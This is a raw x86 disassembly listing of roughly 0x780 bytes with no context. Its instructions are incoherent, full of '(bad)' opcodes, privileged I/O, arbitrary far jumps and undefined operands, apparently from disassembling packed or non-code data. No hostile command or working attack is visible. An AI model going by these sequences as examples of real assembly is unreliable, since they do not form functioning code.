  41abe5:	bound  edi,QWORD PTR [esi+0x6d]
  41abe8:	xchg   BYTE PTR [edx+0x2a],bl
  41abeb:	and    al,0xd0
  41abed:	cli    
  41abee:	add    DWORD PTR [edx-0x2703a3d7],0x4d
  41abf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf6:	lods   al,BYTE PTR ds:[esi]
  41abf7:	(bad)  
  41abf8:	mov    ebx,0x95c57487
  41abfd:	icebp  
  41abfe:	push   ebp
  41abff:	scas   eax,DWORD PTR es:[edi]
  41ac00:	xchg   ecx,eax
  41ac01:	lock in al,0x5e
  41ac04:	clc    
  41ac05:	and    ebp,DWORD PTR [edx-0x4]
  41ac08:	into   
  41ac09:	call   DWORD PTR [eax-0x10]
  41ac0c:	xor    eax,0x6e0d3555
  41ac11:	lock gs pop esi
  41ac14:	cli    
  41ac15:	jne    0x41ac82
  41ac17:	mov    ch,0x74
  41ac19:	js     0x41ac2e
  41ac1b:	imul   esp,esi,0xb85aaacf
  41ac21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac22:	aad    0x77
  41ac24:	ror    esp,0xcf
  41ac27:	pop    es
  41ac28:	add    DWORD PTR [ecx],edi
  41ac2a:	in     eax,dx
  41ac2b:	and    DWORD PTR [ebp-0x30],0x58a15775
  41ac32:	stos   DWORD PTR es:[edi],eax
  41ac33:	push   0xffffffb9
  41ac35:	mov    al,0x3d
  41ac37:	or     edx,ecx
  41ac39:	rol    ecx,0x44
  41ac3c:	popa   
  41ac3d:	retf   0xeed4
  41ac40:	daa    
  41ac41:	out    0x4e,eax
  41ac43:	jmp    0xb6048235
  41ac48:	stos   BYTE PTR es:[edi],al
  41ac49:	cmp    eax,edx
  41ac4b:	ficomp DWORD PTR [edi-0x5a69469d]
  41ac51:	test   DWORD PTR [edx],0x44798634
  41ac57:	dec    ebx
  41ac58:	mov    dl,0xce
  41ac5a:	push   0x319e14c2
  41ac5f:	xchg   eax,edi
  41ac61:	xor    DWORD PTR [ebx+0x7656807a],ecx
  41ac67:	sar    BYTE PTR [ecx+0x54],cl
  41ac6a:	mov    ch,0x9f
  41ac6c:	jmp    DWORD PTR [ebp+0x7b7b3439]
  41ac72:	imul   eax,edi,0xffffffd8
  41ac75:	cmp    BYTE PTR [edx+0xd525ddb],ch
  41ac7b:	push   0xfffffff9
  41ac7d:	xchg   edi,eax
  41ac7e:	pop    ecx
  41ac7f:	mov    esi,0x8c93e29b
  41ac84:	out    0x29,al
  41ac86:	call   0xa8f6:0x3b37920e
  41ac8d:	shr    esi,1
  41ac8f:	int    0x78
  41ac91:	iret   
  41ac92:	sti    
  41ac93:	retf   0x28d
  41ac96:	xor    eax,0xd671f44f
  41ac9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac9c:	repz mov ebx,0x73043aca
  41aca2:	push   0x26b12702
  41aca7:	aas    
  41aca8:	pop    esi
  41aca9:	cmp    edx,0x71
  41acac:	ds stc 
  41acae:	scas   eax,DWORD PTR es:[edi]
  41acaf:	add    BYTE PTR [esi+0x4e],dl
  41acb2:	das    
  41acb3:	push   ds
  41acb4:	add    bl,BYTE PTR [edx]
  41acb6:	jne    0x41ac49
  41acb8:	mov    dl,0x93
  41acba:	ja     0x41acd1
  41acbc:	inc    ecx
  41acbd:	dec    ebp
  41acbe:	pop    esp
  41acbf:	and    BYTE PTR [ebx],bh
  41acc1:	cmp    eax,0xfac5a4e1
  41acc6:	mov    esi,0xe42f9cc2
  41accb:	push   ds
  41accc:	inc    ebx
  41accd:	addr16 mov ecx,0x3ea8adf8
  41acd3:	mov    esp,0xb98db020
  41acd8:	ret    0x720d
  41acdb:	std    
  41acdc:	clc    
  41acdd:	or     BYTE PTR [ebx],dl
  41acdf:	hlt    
  41ace0:	sbb    edx,ebp
  41ace2:	mov    bl,0x7d
  41ace4:	add    DWORD PTR [esi+esi*8-0x62ba82f],esi
  41aceb:	dec    ebp
  41acec:	(bad)  
  41aced:	xchg   esi,eax
  41acee:	inc    edi
  41acef:	cmp    al,0xfd
  41acf1:	shl    BYTE PTR [ebp+0x78],0x89
  41acf5:	mov    edi,0xf07ceae0
  41acfa:	jbe    0x41acad
  41acfc:	inc    BYTE PTR [ecx-0x23]
  41acff:	ror    ebx,0xe7
  41ad02:	ja     0x41ac9e
  41ad04:	sbb    al,0x0
  41ad06:	push   cs
  41ad07:	push   ebx
  41ad08:	dec    edi
  41ad09:	and    eax,0x896bc573
  41ad0e:	dec    ebx
  41ad0f:	mov    esi,0x79c6bdd5
  41ad14:	xlat   BYTE PTR ds:[ebx]
  41ad15:	dec    eax
  41ad16:	addr16 nop
  41ad18:	xchg   ebx,eax
  41ad19:	mov    dh,0xd
  41ad1b:	(bad)  
  41ad1c:	mov    bh,0x2f
  41ad1e:	pop    eax
  41ad1f:	push   ecx
  41ad20:	in     eax,0xdd
  41ad22:	sar    DWORD PTR [ebx+edi*1+0x43a40a9e],0x67
  41ad2a:	call   0x94791644
  41ad2f:	test   ebx,esi
  41ad31:	push   edx
  41ad32:	pop    ecx
  41ad33:	jmp    0xf2732ba6
  41ad38:	mov    ebp,0x9b959c3b
  41ad3d:	fld    DWORD PTR [eax+0x47]
  41ad40:	push   ebx
  41ad41:	arpl   cx,cx
  41ad43:	loope  0x41ad61
  41ad45:	push   esi
  41ad46:	push   esi
  41ad47:	adc    DWORD PTR [eax-0x6f],0x4aac2f59
  41ad4e:	and    al,al
  41ad50:	data16 fwait
  41ad52:	ins    DWORD PTR es:[edi],dx
  41ad53:	pop    ebp
  41ad54:	mov    al,ds:0x5f81f69c
  41ad59:	ret    
  41ad5a:	sti    
  41ad5b:	cwde   
  41ad5c:	(bad)  
  41ad5d:	lahf   
  41ad5e:	push   eax
  41ad5f:	xchg   esi,eax
  41ad60:	icebp  
  41ad61:	push   esi
  41ad62:	inc    cl
  41ad64:	xchg   esi,eax
  41ad65:	push   esp
  41ad66:	imul   bh
  41ad68:	mov    bh,BYTE PTR [ebx-0x6dbb2656]
  41ad6e:	add    BYTE PTR [esi+0x75],cl
  41ad71:	mov    edx,0xc14c5674
  41ad76:	cmc    
  41ad77:	clc    
  41ad78:	(bad)
  41ad7c:	mov    DWORD PTR [edx-0xd359b07],eax
  41ad82:	dec    ecx
  41ad83:	sub    cl,bh
  41ad85:	sub    bh,0x12
  41ad88:	cmp    bh,ah
  41ad8a:	mov    edx,0xb04b3a8a
  41ad8f:	fcom   DWORD PTR [ebx+0xfa00e6c]
  41ad95:	cmp    BYTE PTR [edi-0x47e6f34b],ch
  41ad9b:	fcom   QWORD PTR [ecx]
  41ad9d:	mov    esp,ebp
  41ad9f:	jl     0x41ad35
  41ada1:	jge    0x41ae07
  41ada3:	or     ax,0x1f69
  41ada7:	cvtps2pi mm4,xmm6
  41adaa:	and    DWORD PTR [edi+0xac0da3],0xffffffe5
  41adb1:	ins    BYTE PTR es:[edi],dx
  41adb2:	lds    ecx,FWORD PTR [edx+0x41]
  41adb5:	sbb    BYTE PTR [esi],0x23
  41adb8:	test   al,0x65
  41adba:	mov    edx,0xe3fb413c
  41adbf:	dec    ecx
  41adc0:	aaa    
  41adc1:	or     edx,DWORD PTR ds:0x1bfc6702
  41adc7:	pop    esp
  41adc8:	fldcw  WORD PTR [ebx+ecx*2-0x4c]
  41adcc:	mov    edx,0x6c3c3581
  41add1:	and    bl,BYTE PTR [eax-0x37]
  41add4:	test   DWORD PTR [edx+0x3b],ebx
  41add7:	jae    0x41ad5d
  41add9:	bound  edx,QWORD PTR [esi+0x7a]
  41addc:	fiadd  WORD PTR [esi-0x7f]
  41addf:	xor    esi,DWORD PTR [ebp-0x60f1c08a]
  41ade5:	sbb    al,0xcf
  41ade7:	mov    bh,0x93
  41ade9:	out    dx,eax
  41adea:	cmc    
  41adeb:	fwait
  41adec:	into   
  41aded:	retf   
  41adee:	xor    DWORD PTR [ecx+ebp*4-0x5a],ebp
  41adf2:	out    0x4c,al
  41adf4:	and    eax,0x70e09f9b
  41adf9:	mov    dh,0x5a
  41adfb:	mov    ds:0xbf792523,eax
  41ae00:	fadd   DWORD PTR [edi-0x502996c8]
  41ae06:	ret    0x720
  41ae09:	sub    al,cl
  41ae0b:	or     eax,0xedc8c8e6
  41ae10:	ins    DWORD PTR es:[edi],dx
  41ae11:	stos   DWORD PTR es:[edi],eax
  41ae12:	(bad)  
  41ae13:	sti    
  41ae14:	ficom  DWORD PTR [edx]
  41ae16:	stos   DWORD PTR es:[edi],eax
  41ae17:	xchg   ch,bh
  41ae19:	mov    ecx,DWORD PTR [ecx+ebx*8-0x5e271430]
  41ae20:	push   edi
  41ae21:	sbb    al,BYTE PTR [ebx-0x28]
  41ae24:	jge    0x41ae0f
  41ae26:	sbb    dl,ah
  41ae28:	ins    DWORD PTR es:[edi],dx
  41ae29:	loop   0x41adb6
  41ae2b:	fs ret 0x581a
  41ae2f:	je     0x41ae3f
  41ae31:	(bad)  
  41ae33:	mov    cl,0x6
  41ae35:	mov    ch,0xb7
  41ae37:	xlat   BYTE PTR ds:[ebx]
  41ae38:	ss test ebx,esp
  41ae3b:	jmp    0x7084:0xa8766e5e
  41ae42:	popf   
  41ae43:	jnp    0x41adf0
  41ae45:	mov    dh,0x76
  41ae47:	(bad)  
  41ae48:	outs   dx,DWORD PTR gs:[esi]
  41ae4a:	das    
  41ae4b:	fsub   QWORD PTR [eax]
  41ae4d:	in     eax,0x75
  41ae4f:	popa   
  41ae50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae51:	jcxz   0x41ae76
  41ae54:	shl    DWORD PTR [ecx+ebx*4+0x5a],cl
  41ae58:	jne    0x41ae77
  41ae5a:	sbb    eax,0x8ed4fe93
  41ae5f:	sub    eax,0x21c1b69f
  41ae64:	xor    ah,cl
  41ae66:	xor    esi,esp
  41ae68:	or     BYTE PTR [edi-0x28],dl
  41ae6b:	add    esi,DWORD PTR ss:[ecx-0x7d]
  41ae6f:	sbb    ebp,DWORD PTR [esi-0x40ff399]
  41ae75:	mov    ch,BYTE PTR [eax-0x7479ae9]
  41ae7b:	push   ecx
  41ae7c:	mov    ah,0xc4
  41ae7e:	stos   BYTE PTR es:[edi],al
  41ae7f:	fnstenv [esi]
  41ae81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae82:	pop    ecx
  41ae83:	dec    eax
  41ae84:	test   eax,0x3f6aae95
  41ae89:	retf   0x1684
  41ae8c:	adc    al,0x2f
  41ae8e:	jecxz  0x41ae90
  41ae90:	jl     0x41ae22
  41ae92:	je     0x41ae6f
  41ae94:	adc    BYTE PTR [ebp-0x79],dl
  41ae97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae98:	ins    BYTE PTR es:[edi],dx
  41ae99:	adc    BYTE PTR [eax+0x32],ah
  41ae9c:	retf   
  41ae9d:	and    ah,BYTE PTR [ebx]
  41ae9f:	xchg   edi,eax
  41aea0:	aas    
  41aea1:	sbb    dh,BYTE PTR ds:0xe76e2445
  41aea7:	mov    eax,0xd22cb499
  41aeac:	adc    DWORD PTR [esi],edi
  41aeae:	push   esp
  41aeaf:	add    eax,0xe50731e8
  41aeb4:	mov    edx,0xfe1b0ce4
  41aeb9:	mov    ds:0xfc2f8e4f,eax
  41aebe:	adc    esi,esi
  41aec0:	in     al,dx
  41aec1:	add    BYTE PTR [edi+0x73],cl
  41aec4:	ss push ss
  41aec6:	inc    edi
  41aec7:	ret    0x91f
  41aeca:	and    DWORD PTR [edi+0x493414a8],ebx
  41aed0:	outs   dx,BYTE PTR ds:[esi]
  41aed1:	cmc    
  41aed2:	stc    
  41aed3:	mov    ebx,0x1efafdfc
  41aed8:	mov    dh,0x2f
  41aeda:	jl     0x41aef8
  41aedc:	inc    ebp
  41aedd:	pusha  
  41aede:	rcl    DWORD PTR [esi-0x2f],0xbc
  41aee2:	stc    
  41aee3:	cld    
  41aee4:	repz mov WORD PTR [esi-0x3f],ss
  41aee8:	mov    dl,0x13
  41aeea:	mov    ebx,0x590f794c
  41aeef:	sbb    DWORD PTR [ecx+ecx*2+0x27],eax
  41aef3:	mov    ebx,esp
  41aef5:	sub    al,0x28
  41aef7:	lock fdiv QWORD PTR [ebp-0x3ae7d1d6]
  41aefe:	jo     0x41aee7
  41af00:	sbb    BYTE PTR [ebx-0x6088a5a8],bh
  41af06:	out    dx,al
  41af07:	pop    esi
  41af08:	add    esi,DWORD PTR [esi]
  41af0a:	lock xchg ebx,eax
  41af0c:	test   dl,bl
  41af0e:	adc    edx,DWORD PTR [edi+0x6e519e0f]
  41af14:	pop    ss
  41af15:	(bad)  
  41af16:	adc    BYTE PTR [esi+esi*1-0x5fe1fd45],dh
  41af1d:	loopne 0x41aeb6
  41af1f:	jp     0x41af9c
  41af21:	inc    edx
  41af22:	cmp    DWORD PTR [edx-0x6f],esi
  41af25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af26:	stc    
  41af27:	lods   eax,DWORD PTR ds:[esi]
  41af28:	shl    DWORD PTR ds:0x383b64db,1
  41af2e:	out    dx,al
  41af2f:	pop    esp
  41af30:	sbb    eax,0x79db9ba2
  41af35:	cmp    cl,BYTE PTR [ecx+0x1767cf0a]
  41af3b:	inc    edi
  41af3c:	fs mov dh,0xbb
  41af3f:	(bad)  
  41af40:	mov    dl,0xb9
  41af42:	shl    edi,1
  41af44:	stc    
  41af45:	pop    esi
  41af46:	inc    edi
  41af47:	mov    WORD PTR [edi-0x23772265],?
  41af4d:	inc    ebx
  41af4e:	sbb    edi,0x1a
  41af51:	out    0xaa,eax
  41af53:	add    DWORD PTR [ebx],edi
  41af55:	ficom  DWORD PTR [ecx+edi*4-0x40]
  41af59:	cmc    
  41af5a:	in     al,dx
  41af5b:	inc    esp
  41af5c:	dec    edx
  41af5d:	jne    0x41afb6
  41af5f:	inc    ebp
  41af60:	adc    eax,DWORD PTR [eax]
  41af62:	test   DWORD PTR [edi+0x2081fc5d],esi
  41af68:	cli    
  41af69:	aaa    
  41af6a:	ins    DWORD PTR es:[edi],dx
  41af6b:	mov    edx,0x35d66340
  41af70:	xchg   DWORD PTR [eax],ebp
  41af72:	lods   al,BYTE PTR ds:[esi]
  41af73:	int    0xd7
  41af75:	mov    ecx,0x2b51a171
  41af7a:	je     0x41afd6
  41af7c:	sbb    al,0x99
  41af7e:	push   0x56
  41af80:	daa    
  41af81:	outs   dx,BYTE PTR ds:[esi]
  41af82:	mov    esp,0x6f81c730
  41af87:	adc    BYTE PTR [esi],bh
  41af89:	rcl    DWORD PTR [edx-0x6f],1
  41af8c:	outs   dx,BYTE PTR ds:[esi]
  41af8d:	(bad)  
  41af8e:	sub    DWORD PTR [ecx-0xe51f5a2],eax
  41af94:	cli    
  41af95:	(bad)  
  41af97:	mov    cl,0x55
  41af99:	aam    0x49
  41af9b:	cmp    al,BYTE PTR fs:0x4e6cb803
  41afa2:	xchg   BYTE PTR [ebx],cl
  41afa4:	fimul  WORD PTR [edi]
  41afa6:	pop    ss
  41afa7:	sahf   
  41afa8:	mov    BYTE PTR [edx+0x32ddbb10],0xe5
  41afaf:	push   esi
  41afb0:	ror    ah,cl
  41afb2:	stos   BYTE PTR es:[edi],al
  41afb3:	call   0x3afecff3
  41afb8:	xchg   edi,eax
  41afb9:	and    al,0xd5
  41afbb:	mov    DWORD PTR ds:0x3f9cb442,edi
  41afc1:	push   edi
  41afc2:	ins    DWORD PTR es:[edi],dx
  41afc3:	push   cs
  41afc4:	cs xchg edi,eax
  41afc6:	int    0xdf
  41afc8:	test   DWORD PTR [ebx-0x37],0xe0e9877
  41afcf:	and    DWORD PTR ds:0x64d4a2be,edi
  41afd5:	ja     0x41af79
  41afd7:	js     0x41b016
  41afd9:	cmc    
  41afda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afdb:	into   
  41afdc:	inc    eax
  41afdd:	xchg   edi,eax
  41afde:	mov    eax,0xb2e5cfc5
  41afe3:	push   eax
  41afe4:	enter  0x9f9,0xe9
  41afe8:	ja     0x41af78
  41afea:	mov    bl,BYTE PTR [ecx]
  41afec:	push   ecx
  41afed:	daa    
  41afee:	mov    bh,BYTE PTR [ebx-0x43da23a1]
  41aff4:	test   DWORD PTR [edx],edi
  41aff6:	mov    ds,edx
  41aff8:	jge    0x41af97
  41affa:	rol    BYTE PTR [ebx],cl
  41affc:	mov    bl,0xf
  41affe:	cdq    
  41afff:	add    bl,BYTE PTR [edx-0x33]
  41b002:	dec    edx
  41b003:	out    dx,eax
  41b004:	mov    ecx,0x6e129c09
  41b009:	xchg   edi,eax
  41b00a:	xchg   edx,eax
  41b00b:	xor    cl,0x2
  41b00e:	or     al,0x97
  41b010:	mov    ah,0x30
  41b012:	leave  
  41b013:	mov    edi,0x407b201c
  41b018:	cwde   
  41b019:	retf   
  41b01a:	popa   
  41b01b:	stos   DWORD PTR es:[edi],eax
  41b01c:	jmp    0xb3ae:0x220cbf34
  41b023:	xor    ah,bl
  41b025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b026:	(bad)  
  41b027:	shr    DWORD PTR [edx-0x4249f467],0x6a
  41b02e:	pop    eax
  41b02f:	pop    esp
  41b030:	into   
  41b031:	out    dx,al
  41b032:	js     0x41b097
  41b034:	or     al,0xaf
  41b036:	ret    
  41b037:	jns    0x41b083
  41b039:	(bad)  
  41b03a:	cld    
  41b03b:	mov    DWORD PTR [ecx+0x2af198bb],ebx
  41b041:	adc    ch,BYTE PTR [edi]
  41b043:	mov    al,ds:0xc456fa71
  41b048:	imul   ecx,DWORD PTR [ecx+0x7f],0xffffffb7
  41b04c:	lds    edi,FWORD PTR [ebp-0xec1f819]
  41b052:	xor    ecx,0x920798ee
  41b058:	inc    esi
  41b059:	loopne 0x41b028
  41b05b:	push   0x33dd59f6
  41b060:	bswap  edx
  41b062:	push   ebp
  41b063:	adc    BYTE PTR [edi-0x7660c9eb],ch
  41b069:	push   cs
  41b06a:	je     0x41b07c
  41b06c:	iret   
  41b06d:	jge    0x41b0ed
  41b06f:	lahf   
  41b070:	pushf  
  41b071:	pop    edi
  41b072:	xor    dl,dh
  41b074:	fwait
  41b075:	icebp  
  41b076:	mov    edi,0x6e798b4e
  41b07b:	add    al,0x24
  41b07d:	imul   eax,esp,0xffffffc5
  41b080:	pushf  
  41b081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b082:	xor    al,0xdb
  41b084:	cmp    edi,DWORD PTR [ebp+ecx*2-0x26285877]
  41b08b:	or     DWORD PTR [esi],edi
  41b08d:	jl     0x41b012
  41b08f:	pop    edx
  41b090:	jle    0x41b091
  41b092:	ins    BYTE PTR es:[edi],dx
  41b093:	push   ss
  41b094:	and    eax,esp
  41b096:	iret   
  41b097:	cmp    DWORD PTR [ebx-0x48],ebx
  41b09a:	jmp    0x41b0fd
  41b09c:	imul   eax,DWORD PTR [ebx],0x71
  41b09f:	or     ebx,DWORD PTR [esi+0x19e97482]
  41b0a5:	lock inc esi
  41b0a7:	sub    DWORD PTR [ebp-0xa55ce9],0x4b
  41b0ae:	mov    esi,0x426c72bb
  41b0b3:	adc    al,0x3
  41b0b5:	fwait
  41b0b6:	adc    BYTE PTR [edi],al
  41b0b8:	push   ds
  41b0b9:	push   ds
  41b0ba:	lds    eax,FWORD PTR [esi+0x5a39349]
  41b0c0:	cs push ss
  41b0c2:	xchg   esi,eax
  41b0c3:	bound  ecx,QWORD PTR [eax-0x179449c7]
  41b0c9:	clc    
  41b0ca:	repnz sub DWORD PTR [esi+edx*2-0x4baf9966],esi
  41b0d2:	mov    ebp,0x954241ec
  41b0d7:	inc    esi
  41b0d8:	mov    ds:0xf12447de,al
  41b0dd:	and    ecx,DWORD PTR [esp+ecx*2-0x5e]
  41b0e1:	pop    edx
  41b0e2:	outs   dx,BYTE PTR ds:[esi]
  41b0e3:	push   edi
  41b0e4:	dec    esp
  41b0e5:	nop
  41b0e6:	or     bl,0x3b
  41b0e9:	mov    ?,WORD PTR [eax]
  41b0eb:	(bad)  
  41b0ec:	ins    BYTE PTR es:[edi],dx
  41b0ed:	push   ecx
  41b0ee:	cld    
  41b0ef:	xor    al,BYTE PTR [ebx+0x78]
  41b0f2:	xor    al,0x2e
  41b0f4:	adc    ch,BYTE PTR ss:[ebp+0x2425ada9]
  41b0fb:	jl     0x41b0de
  41b0fd:	add    esp,ebp
  41b0ff:	fisttp QWORD PTR [edx+0x3733cf79]
  41b105:	jbe    0x41b099
  41b107:	jns    0x41b0b3
  41b109:	xchg   edi,eax
  41b10a:	mov    ebx,0x6c83c097
  41b10f:	ins    BYTE PTR es:[edi],dx
  41b110:	inc    esp
  41b111:	dec    ecx
  41b112:	mov    ds:0xe37581bb,eax
  41b117:	(bad)  
  41b118:	dec    edi
  41b119:	mov    DWORD PTR [ebx+0x2a],ebp
  41b11c:	mov    edi,0xec7d318
  41b121:	xchg   edi,eax
  41b122:	in     eax,dx
  41b123:	cmp    BYTE PTR [eax-0x1181828c],bl
  41b129:	and    eax,0x296ce3c3
  41b12e:	xor    DWORD PTR [esp+ebp*8-0x50],esp
  41b132:	dec    edx
  41b133:	xchg   al,al
  41b135:	mov    dh,0xb7
  41b137:	xchg   ebx,ebp
  41b139:	stos   DWORD PTR es:[edi],eax
  41b13a:	jmp    0xd4e1:0x330e7c64
  41b141:	repz jo 0x41b106
  41b144:	mov    cl,0x21
  41b146:	sub    ebp,DWORD PTR [edi+0x7c44c288]
  41b14c:	inc    eax
  41b14d:	lock push ecx
  41b14f:	loop   0x41b1a7
  41b151:	xchg   BYTE PTR [esp+ecx*4+0x25],bh
  41b155:	push   esp
  41b156:	xor    BYTE PTR [edx-0x54],0x8b
  41b15a:	push   0xd1d72071
  41b15f:	sub    DWORD PTR [esi],edx
  41b161:	int3   
  41b162:	cmp    DWORD PTR ds:0xcc682f58,0x453089e0
  41b16c:	std    
  41b16d:	add    bh,bh
  41b16f:	out    dx,al
  41b170:	add    al,0xe7
  41b172:	iret   
  41b173:	lds    ecx,FWORD PTR [esi-0x30]
  41b176:	lds    ecx,FWORD PTR [ebx-0x16abca63]
  41b17c:	jb     0x41b1a6
  41b17e:	lds    esi,FWORD PTR [ecx+ebx*4+0x4c]
  41b182:	push   ebp
  41b183:	push   esi
  41b184:	(bad)
  41b187:	fild   DWORD PTR [ecx+0x5b]
  41b18a:	aad    0xbc
  41b18c:	rol    DWORD PTR [eax],cl
  41b18e:	and    BYTE PTR [ebx-0x17],0xc7
  41b192:	push   eax
  41b193:	pop    ebx
  41b194:	xchg   esp,eax
  41b195:	shl    BYTE PTR [ebp+0x3cd65b2b],1
  41b19b:	(bad)  
  41b19c:	dec    ecx
  41b19d:	aam    0xab
  41b19f:	mov    ch,0xcb
  41b1a1:	fnclex 
  41b1a3:	imul   esi,esi,0x32
  41b1a6:	sbb    bl,BYTE PTR [esi]
  41b1a8:	out    0xd4,al
  41b1aa:	cdq    
  41b1ab:	xchg   BYTE PTR [eax+0x7f4d00a9],dh
  41b1b1:	jb     0x41b14a
  41b1b3:	inc    ebp
  41b1b4:	in     eax,0x76
  41b1b6:	add    BYTE PTR [eax],dl
  41b1b8:	dec    ecx
  41b1b9:	add    edx,DWORD PTR [edx-0x1d]
  41b1bc:	sbb    al,0x2
  41b1be:	sub    BYTE PTR ds:0x9dcfbb91,al
  41b1c4:	ss adc eax,0xaf19c8ad
  41b1ca:	mov    al,ds:0x4e1b027f
  41b1cf:	and    eax,0xdbca48f9
  41b1d4:	dec    esp
  41b1d5:	inc    ebp
  41b1d6:	xor    BYTE PTR [ecx],0x17
  41b1d9:	pop    esi
  41b1da:	jmp    0x9ec8ee58
  41b1df:	shr    DWORD PTR [ebx*2-0x731149ff],cl
  41b1e6:	pop    ebx
  41b1e7:	cmp    al,0xc4
  41b1e9:	sbb    al,0xa4
  41b1eb:	pushf  
  41b1ec:	inc    esp
  41b1ed:	mov    esi,0x65da1513
  41b1f2:	test   DWORD PTR ds:0x33f370e9,ebp
  41b1f8:	popf   
  41b1f9:	sbb    eax,0x4d50e3ba
  41b1fe:	push   0x914c865d
  41b203:	mov    cl,0x4e
  41b205:	mov    edx,0x3c6712e8
  41b20a:	pop    eax
  41b20b:	mov    esi,0x5776245f
  41b210:	xchg   DWORD PTR [ecx+0x304caaf3],esp
  41b216:	pop    eax
  41b217:	scas   eax,DWORD PTR es:[edi]
  41b218:	pop    ebx
  41b219:	and    DWORD PTR [edx],edx
  41b21b:	sub    edi,ebp
  41b21d:	test   ch,0xb5
  41b220:	dec    ebx
  41b221:	lea    esp,[edi+0x70450135]
  41b227:	and    ecx,edi
  41b229:	js     0x41b1c4
  41b22b:	jbe    0x41b1ec
  41b22d:	aam    0x36
  41b22f:	jmp    FWORD PTR ds:0x86f3dd6
  41b235:	or     dl,ah
  41b237:	sbb    DWORD PTR [esi+0x4a04b875],ebx
  41b23d:	das    
  41b23e:	fs mov esi,0x1421d7fd
  41b244:	mov    ah,0xdc
  41b246:	inc    esp
  41b247:	aad    0xb9
  41b249:	xchg   edx,eax
  41b24a:	push   ebx
  41b24b:	push   esp
  41b24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b24d:	add    esi,DWORD PTR [eax+0x304af05b]
  41b253:	into   
  41b254:	cmp    al,0xe2
  41b256:	inc    eax
  41b257:	popf   
  41b258:	cmp    BYTE PTR [eax],ah
  41b25a:	je     0x41b2c2
  41b25c:	(bad)  
  41b25d:	cli    
  41b25e:	scas   eax,DWORD PTR es:[edi]
  41b25f:	imul   ebx,ebp,0x19
  41b262:	fimul  WORD PTR [edx-0x35]
  41b265:	push   DWORD PTR [eax-0x71]
  41b268:	cmc    
  41b269:	out    dx,al
  41b26a:	xchg   ebx,eax
  41b26b:	je     0x41b234
  41b26d:	push   ss
  41b26e:	out    0x9a,eax
  41b270:	test   BYTE PTR [ebx+0x6a],0x47
  41b274:	mov    ah,BYTE PTR [bx+di]
  41b277:	pop    ds
  41b278:	aas    
  41b279:	mov    ah,0xda
  41b27b:	xor    BYTE PTR [ebp-0x4902fbb6],cl
  41b281:	fld    DWORD PTR [ebx-0x70]
  41b284:	je     0x41b245
  41b286:	xor    DWORD PTR [ecx+0x232b2010],esp
  41b28c:	cmova  ebp,DWORD PTR [ecx]
  41b28f:	push   ebp
  41b290:	jmp    0x41b2fc
  41b292:	mov    eax,ds:0xaa315fa5
  41b297:	pop    esp
  41b298:	pop    ebx
  41b299:	add    ecx,0xffffffe0
  41b29c:	jl     0x41b2b3
  41b29e:	aaa    
  41b29f:	dec    edx
  41b2a0:	xchg   edx,eax
  41b2a1:	dec    esp
  41b2a2:	or     DWORD PTR [esp+ebp*4+0x51],0x48
  41b2a7:	outs   dx,BYTE PTR ds:[esi]
  41b2a8:	lahf   
  41b2a9:	pop    esp
  41b2aa:	in     al,dx
  41b2ab:	or     al,0x6a
  41b2ad:	dec    edx
  41b2ae:	mov    ds:0x938dfb8e,al
  41b2b3:	test   eax,0x7743a32b
  41b2b8:	cmp    eax,DWORD PTR [edx+0x22]
  41b2bb:	push   0x926b80e4
  41b2c0:	jno    0x41b2e7
  41b2c2:	addr16 or eax,0x81dcaac8
  41b2c8:	xor    DWORD PTR [ebx-0x4bf58d31],ebp
  41b2ce:	aad    0x8a
  41b2d0:	fld    TBYTE PTR [edx-0x1c]
  41b2d3:	out    0xc,al
  41b2d5:	cs rcr ebp,1
  41b2d8:	mov    al,ds:0xe09f78ac
  41b2dd:	jmp    0x9dcc6e4d
  41b2e2:	jns    0x41b28f
  41b2e4:	push   ecx
  41b2e5:	inc    eax
  41b2e6:	and    eax,0x2aa8bdf4
  41b2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ec:	dec    edx
  41b2ed:	mov    ebx,0x98bbe1e6
  41b2f2:	sub    eax,0xc6155591
  41b2f7:	pop    ecx
  41b2f8:	retf   0xd3a1
  41b2fb:	std    
  41b2fc:	lock out dx,al
  41b2fe:	cmp    edx,DWORD PTR [ebp+0x797d4dbe]
  41b304:	mov    edi,edi
  41b306:	jg     0x41b2b8
  41b308:	arpl   dx,sp
  41b30a:	inc    edx
  41b30b:	(bad)  
  41b30c:	cmc    
  41b30d:	inc    ebp
  41b30e:	out    0x92,al
  41b310:	aas    
  41b311:	sbb    esi,DWORD PTR [ecx]
  41b313:	popw   ss
  41b315:	pop    esp
  41b316:	ins    BYTE PTR es:[edi],dx
  41b317:	dec    ebp
  41b318:	(bad)  
  41b319:	in     al,0x1d
  41b31b:	xor    BYTE PTR [ebx+0x71],0xc0
  41b31f:	xor    al,0xa0
  41b321:	loopne 0x41b332
  41b323:	imul   edi,DWORD PTR [ecx],0xffffff9a
  41b326:	or     ebx,DWORD PTR [edx+0x4fce191d]
  41b32c:	jb     0x41b368
  41b32e:	into   
  41b32f:	sbb    BYTE PTR [edx],bl
  41b331:	int3   
  41b332:	icebp  
  41b333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b334:	xor    al,0x2d
  41b336:	xor    DWORD PTR ds:0xd32a5d34,edx
  41b33c:	or     al,cl
  41b33e:	inc    edi
  41b33f:	das    
  41b340:	add    BYTE PTR cs:[edx-0x33],bl
  41b344:	or     eax,0x369174fc
  41b349:	je     0x41b38a
  41b34b:	or     al,cl
  41b34d:	jg     0x41b360
  41b34f:	push   edi
  41b350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b351:	push   eax
  41b352:	sub    cl,BYTE PTR [ebx]
  41b354:	jl     0x41b2e6
  41b356:	mov    eax,0xfa33a24c
  41b35b:	inc    esp
  41b35c:	add    esp,eax
  41b35e:	mov    al,0x6
  41b360:	push   esi
  41b361:	std    
  41b362:	es pop ss
  41b364:	(bad)  
